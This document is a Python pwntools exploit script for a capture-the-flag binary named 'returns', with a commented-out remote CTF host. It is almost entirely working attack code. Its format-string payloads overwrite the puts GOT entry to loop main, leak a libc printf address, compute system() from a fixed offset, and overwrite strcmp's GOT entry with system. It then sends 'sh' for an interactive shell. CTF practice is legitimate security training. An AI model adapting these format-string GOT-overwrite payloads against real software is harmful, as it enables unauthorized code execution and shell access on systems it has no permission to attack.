#!/usr/bin/env python

from pwn import *


p = process('./returns')
#p = remote('shell.actf.co', 19307)

#raw_input()

print(p.recvuntil('What item would you like to return?'))
print(p.recv())


# change the GOT of puts to main(), to invoke main again and again...
puts_got = 0x404018
#p.sendline("AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJ\x18\x40\x40\x00\x00\x00\x00\x00\x1a\x40\x40\x00\x00\x00\x00\x00\x1c\x40\x40\x00\x00\x00\x00\x00%8$p%9$p%10$p")
string = "%4198822x%12$n%61018x%13$hnZZZZZ\x18\x40\x40\x01\x00\x00\x00\x00\x1c\x40\x40\x00\x00\x00\x00\x00"

with open('exploit.txt','wb') as f:
    f.write(string)

p.sendline(string)


string = ''
while True:
    string += p.recv(4096)
    if '@@' in string:
        break
    print(len(string))
string = ''
while True:
    string += p.recv(4096)
    if '@@' in string:
        break
    print(len(string))

string = ''
while True:
    string += p.recv(4096)
    if 'you like to return?' in string:
        break
    print(len(string))

print(string[len(string)-50:])



# 2nd stage.. leak libc address
p.sendline("%9$szzzz\x38\x40\x40\x01\x00\x00\x00\x00")
#p.sendline("%9$szzzz\x40\x40\x40\x01\x00\x00\x00\x00")

string = ''
while True:
    string += p.recv(0x1000)
    if 'you like to return?' in string:
        break

print(string)

#quit()

template = "We didn't sell you a "
libc_printf = u64(string[len(template):len(template)+6] + "\x00\x00")
print(hex(libc_printf))

#quit()
#base_printf = 0x7ffff7a48e80
#base_system = 0x7ffff7a33440

#off_system = base_printf - base_system

#off_system = 165696

off_system = 0x15a40
print(hex(off_system))

libc_system = libc_printf - off_system

print(hex(libc_system))


got_strcmp = 0x404048

four_bytes = libc_system & 0xffffffff

first_two = four_bytes & 0xffff
next_two = (four_bytes >> 16) & 0xffff

print(hex(four_bytes))

print("%08x %08d" % (first_two, first_two))
print("%08x %08d" % (next_two, next_two))
if (first_two > next_two):
    next_two += 65536
    next_two -= first_two

first_two_s = "%" + "%05d" % first_two + "x"
next_two_s = "%" + "%06d" % next_two + "x"

p.sendline(first_two_s + "%12$hn" + next_two_s + "%13$hnaasas\x48\x40\x40\x01\x00\x00\x00\x00\x4a\x40\x40\x00\x00\x00\x00\x00")
p.sendline('sh')
p.interactive()

